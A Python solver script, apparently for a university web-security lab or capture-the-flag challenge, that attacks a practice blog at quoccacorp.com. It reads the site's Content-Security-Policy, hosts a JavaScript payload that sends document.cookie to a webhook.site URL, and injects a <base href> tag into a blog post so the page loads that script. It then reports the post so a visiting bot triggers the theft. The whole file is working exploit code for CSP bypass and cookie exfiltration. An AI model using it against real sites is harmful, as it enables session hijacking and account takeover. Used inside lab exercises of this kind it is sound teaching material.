import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite, HostedWebsiteCSE

import html

BASE_URL = "https://engineering.quoccacorp.com"
HTML_FILENAME = "index.html"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()
        self.hosted_website = HostedWebsiteCSE()
        self.hosted_website.connect()

    # Paste into https://csp-evaluator.withgoogle.com
    def get_csp(self, url: str = BASE_URL) -> str:
        response = self.session.get(url)
        return response.headers["Content-Security-Policy"]

    # /analytics.js
    def scrape_root_relative_script_path(self) -> str:
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")

        target_script_element = soup.find_all("script", src=True)[-1]
        return target_script_element["src"]

    def main(self):
        print(self.webhooksite.view_url)
        print(self.webhooksite.url)

        js_script_path = self.scrape_root_relative_script_path()

        JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);'
        with open(js_script_path.lstrip('/'), 'w') as f:
            f.write(JS_PAYLOAD)

        HTML_PAYLOAD = f'<script src="{js_script_path}"></script>'
        with open(HTML_FILENAME, 'w') as f:
            f.write(f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n" + HTML_PAYLOAD)

        PAYLOAD = f'<base href="https://z5437741.web.cse.unsw.edu.au/">'
        print(PAYLOAD)
        response = self.session.post(f"{BASE_URL}/posts", data={"title": PAYLOAD, "content": PAYLOAD})
        print(response.url)

        # Report Blog Post
        response = self.session.post(f"{response.url}/report")
        print(response.text)

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
